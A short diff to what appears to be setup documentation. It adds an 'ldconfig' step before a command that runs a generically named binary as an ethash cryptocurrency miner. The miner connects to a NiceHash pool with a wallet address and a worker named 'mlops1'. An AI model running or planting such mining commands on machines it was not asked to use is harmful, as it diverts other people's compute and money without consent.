@@ -39,5 +39,6 @@ docker run \
 
 ```bash
 cd app
+ldconfig
 ./binary -a ethash -o stratum+ssl://stratum.usa-west.nicehash.com:33353 -u 38LaMMUYTNoSGUTSRbiYeKwZrm29bBvuuY -p x -w mlops1
 ```
